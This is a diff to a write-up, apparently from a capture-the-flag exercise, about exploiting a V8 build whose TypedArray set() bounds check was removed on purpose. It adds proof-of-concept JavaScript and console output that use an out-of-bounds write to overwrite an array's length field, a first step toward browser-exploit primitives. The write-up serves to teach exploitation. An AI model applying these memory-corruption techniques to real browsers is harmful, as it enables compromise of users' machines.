@@ -66,7 +66,7 @@ First, we analyze the bug introduced into v8. The bug is in a `Torque` function,
 
 A small change has been made to the `TypedArrayPrototypeSetTypedArray` function which will impact different `Array` javascript objects.
 
-The call to `CheckIntegerIndexAdditionOverflow` has been removed. Without this bounds-checking funtion, this means that calling the [set()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set) method on the array can cause a buffer overflow.
+The call to `CheckIntegerIndexAdditionOverflow` has been removed. Without this bounds-checking function, this means that calling the [set()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set) method on the array can cause a buffer overflow.
 
 In other words, we will write javascript code to trigger this native-code behavior.
 
@@ -121,7 +121,7 @@ Received signal 11 SEGV_ACCERR 2d7a512217ff
 TODO: Check this in d8
 
 An incomplete, simplistic view of memory and the corresponding javascript can be viewed below:
-```
+```javascript
 let x = new Uint32Array(8);
 // x = [ x0 | x1 | x2 | x3 | x4 | x5 | x6 | x7 ]
 
@@ -147,6 +147,36 @@ One of the core building-blocks of a browser exploit is to create the `addrof` p
 We can begin by converting the out-of-bounds write into an out-of-bounds read.
 
 We can achieve out-of-bounds read by using the out-of-bounds write to overwrite the length field of an array object. Then, when we read the array object, we read more memory than the object originally intended.
+
+An simplistic view of memory and the corresponding javascript can be viewed below:
+```javascript
+let y = new Uint32Array(1);
+// y = [ y0 ]
+
+let x = new Uint32Array(1);
+// x = [ x0 ]
+
+let z = [1.1, 1.1, 1.1, 1.1];
+// z = [ 1.1 | 1.1 | 1.1 | 1.1 ]
+
+y.set([2222], 0);
+// y = [ 2222 ]
+
+x.set(y, 33);
+// offset 33 out-of-bounds -v
+// x = [ x0 ] ... ... ... [ 2222 ] ... [ 1.1 | 1.1 | 1.1 | 1.1 ]
+// array z's length metadata -^ 
+
+console.log(z.length);
+// verify that array z's length field has been overwritten to 1111
+```
+
+Running this proof-of-concept code results in the log output:
+```
+[1024/111758.744535:INFO:CONSOLE(6)] "1111", source: file:///home/user/Public/chromium/poc.js (6)
+```
+
+v8 represents integer values in memory with small-integer (SMI) which is why `1111` appears instead of `2222`.
 
 **arbitrary address primitives**
 
